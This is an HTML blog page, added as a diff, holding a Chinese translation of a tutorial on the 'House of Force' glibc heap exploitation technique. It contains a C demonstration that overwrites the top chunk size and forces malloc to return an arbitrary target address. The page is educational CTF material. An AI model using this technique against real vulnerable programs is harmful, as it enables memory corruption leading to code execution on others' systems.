@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>Heap Exploitation系列翻译-15 House of Force</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>Heap Exploitation系列翻译-15 House of Force</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-12">2017-08-12</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#translations" title="translations">translations</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#heap" title="heap">heap</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<blockquote>
+  <p>本文是对Dhaval Kapil的<a href="https://heap-exploitation.dhavalkapil.com/">Heap Exploitation</a>系列教程的译文</p>
+</blockquote>
+
+<p>与’House of Lore’类似, 这项攻击重点在于从’malloc’返回一个任意的指针. 伪造堆块攻击讨论的是fastbins的情况而’House of Lore’讨论的则是small bin的情况. 在这里’House of Force’则是利用了’top chunk’. topmost chunk 也被称作 ‘wilderness’, 它以堆的末尾作为边界(比如, 它是堆的最大地址)并且不会出现在任何bin链中. 它符合相同的堆块结构格式.</p>
+
+<p>这项攻击技术假定在top chunk的首部存在溢出. 它的<code class="highlighter-rouge">size</code>可以被修改为一个非常大的值(在本例中是<code class="highlighter-rouge">-1</code>), 这能够确保所有初始申请将会使用top chunk来满足要求, 而非依赖于<code class="highlighter-rouge">mmap</code>. 在64位系统, <code class="highlighter-rouge">-1</code>即是<code class="highlighter-rouge">0xFFFFFFFFFFFFFFFF</code>, 一个这样大小的堆块可以覆盖程序的整个内存空间. 让我们假定一下, 攻击者希望’malloc’返回地址’P’. 现在, 任何大小为<code class="highlighter-rouge">&amp;top_chunk</code> - <code class="highlighter-rouge">P</code>的malloc调用都会使用top chunk来满足. 要注意, <code class="highlighter-rouge">P</code>可以在<code class="highlighter-rouge">top_chunk</code>之前或之后. 如果是在前面, 结果就得是一个很大的整数(因为size是无符号的). 但它仍旧是小于<code class="highlighter-rouge">-1</code>的. 在发生完整数溢出并且malloc使用top chunk很好的满足申请需求后, 此刻, top chunk就会指向<code class="highlighter-rouge">P</code>并且之后的任何申请都会直接返回<code class="highlighter-rouge">P</code>!</p>
+
+<p>考虑以下示例代码(下载完整版本: <a href="https://heap-exploitation.dhavalkapil.com/assets/files/house_of_force.c">这里</a>):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Attacker will force malloc to return this pointer
+</span><span class="kt">char</span> <span class="n">victim</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"This is victim's string that will returned by malloc"</span><span class="p">;</span> <span class="c1">// At 0x601060
+</span>
+<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
+  <span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>               <span class="c1">// padding
+</span><span class="p">};</span>
+
+<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="n">chunk</span><span class="p">,</span> <span class="o">*</span><span class="n">top_chunk</span><span class="p">;</span>
+<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
+<span class="kt">size_t</span> <span class="n">requestSize</span><span class="p">,</span> <span class="n">allotedSize</span><span class="p">;</span>
+
+<span class="c1">// First, request a chunk, so that we can get a pointer to top chunk
+</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">256</span><span class="p">);</span>                                                    <span class="c1">// At 0x131a010
+</span><span class="n">chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>                          <span class="c1">// At 0x131a000
+</span>
+<span class="c1">// lower three bits of chunk-&gt;size are flags
+</span><span class="n">allotedSize</span> <span class="o">=</span> <span class="n">chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x1</span> <span class="o">|</span> <span class="mh">0x2</span> <span class="o">|</span> <span class="mh">0x4</span><span class="p">);</span>
+
+<span class="c1">// top chunk will be just next to 'ptr'
+</span><span class="n">top_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">chunk_structure</span> <span class="o">*</span><span class="p">)((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">chunk</span> <span class="o">+</span> <span class="n">allotedSize</span><span class="p">);</span>  <span class="c1">// At 0x131a110
+</span>
+<span class="c1">// here, attacker will overflow the 'size' parameter of top chunk
+</span><span class="n">top_chunk</span><span class="o">-&gt;</span><span class="n">size</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>       <span class="c1">// Maximum size
+</span>
+<span class="c1">// Might result in an integer overflow, doesn't matter
+</span><span class="n">requestSize</span> <span class="o">=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">victim</span>            <span class="c1">// The target address that malloc should return
+</span>                <span class="o">-</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">top_chunk</span>     <span class="c1">// The present address of the top chunk
+</span>                <span class="o">-</span> <span class="mi">2</span><span class="o">*</span><span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">)</span>   <span class="c1">// Size of 'size' and 'prev_size'
+</span>                <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">);</span>    <span class="c1">// Additional buffer
+</span>
+<span class="c1">// This also needs to be forced by the attacker
+// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
+// Making it point to 'victim'
+</span><span class="n">malloc</span><span class="p">(</span><span class="n">requestSize</span><span class="p">);</span>                                                  <span class="c1">// At 0x131a120
+</span>
+<span class="c1">// The top chunk again will service the request and return 'victim'
+</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>                                <span class="c1">// At 0x601060 !! (Same as 'victim')
+</span></code></pre></div></div>
+
+<p>‘malloc’ 返回一个指向<code class="highlighter-rouge">victim</code>的地址</p>
+
+<p>以下几样需要我们注意:</p>
+
+<ol>
+  <li>当计算<code class="highlighter-rouge">to_chunk</code>的准确指针时, 要将prev_size的三个最低位清零, 以获得准确的大小.</li>
+  <li>当计算requestSize, 需要算进一个额外的缓冲区, 这只是用于抵消分配堆块时进行的四舍五入. 顺便一提, 在这种情况下, malloc 会返回一个比申请大小多8字节的堆块. 要注意, 这是与机器相关的.</li>
+  <li><code class="highlighter-rouge">victim</code>可以是任意地址(堆,栈,bss段等地址)</li>
+</ol>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/12/house-of-einherjar/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/12/house-of-lore/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/12/house-of-einherjar/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/12/house-of-lore/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
